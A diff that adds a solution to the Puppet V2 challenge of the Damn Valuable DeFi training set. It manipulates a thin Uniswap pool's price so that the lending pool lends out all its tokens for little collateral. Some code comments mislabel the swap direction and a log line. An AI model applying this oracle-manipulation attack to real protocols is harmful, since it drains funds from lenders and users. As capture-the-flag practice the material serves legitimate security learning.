@@ -9,6 +9,8 @@ import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUn
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
+import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";
+
 
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -99,6 +101,36 @@ contract PuppetV2Challenge is Test {
      */
     function test_puppetV2() public checkSolvedByPlayer {
         
+        address[] memory path = new address[](2);   // path to swap WETH to DVT
+        path[0] = address(token);
+        path[1] = address(weth);
+        //amount needed to borrow all the DVT tokens (before swap):
+        uint256 amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Amount needed to borrow all the DVT tokens (before swap): ", amount);
+        // Swap WETH to DVT
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE, // amountOutMin
+            0, 
+            path,
+            address(player), // to
+            block.timestamp * 2
+        );
+        //amount needed to borrow all the DVT tokens (after swap):
+        amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Amount needed to borrow all the DVT tokens (before swap): ", amount);
+        console.log("User weth/eth balance: ", player.balance);
+        //require player to have enough WETH to deposit
+        require(player.balance >= amount, "Not enough WETH to deposit");
+        weth.deposit{value: amount}();  // deposit the amount needed to borrow all the DVT tokens
+        weth.approve(address(lendingPool), amount); // approve the lending pool to spend the WETH
+        // Borrow all the DVT tokens
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        //send all the DVT tokens to the recovery account
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+
+
+        //the exploit here is: when the user swaps WETH to DVT, because of the low liquidity in the pool, the price of DVT dumps, so the user can borrow all the dvt tokens.
     }
 
     /**
